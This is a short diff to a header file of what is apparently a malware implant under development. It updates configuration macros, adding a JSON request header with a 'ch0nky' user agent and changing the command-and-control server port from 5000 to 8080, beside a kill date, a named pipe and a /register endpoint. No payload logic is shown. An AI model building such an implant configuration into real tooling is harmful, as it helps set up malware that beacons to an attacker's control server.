@@ -5,6 +5,7 @@
 
 #if DEBUG == 1
 #include <stdio.h>
+#include <iostream>
 #define LOG wprintf
 #else
 #define LOG void
@@ -17,9 +18,9 @@
 #define MALWARE_KILL_DATE_YEAR 2022 
 #define MALWARE_NAMED_PIPE "ch0nky"
 
-#define MALWARE_USER_AGENT L"ch0nky"
+#define MALWARE_JSON_REQUEST_HEADER L"Content-Type: application/json\r\nUser-Agent: ch0nky\r\n"
 #define MALWARE_C2_SERVER_ADDRESS L"http://127.0.0.1"
-#define MALWARE_C2_SERVER_PORT 5000
+#define MALWARE_C2_SERVER_PORT 8080
 #define MALWARE_C2_SERVER_REGISTER_URI L"/register"
 
 #endif
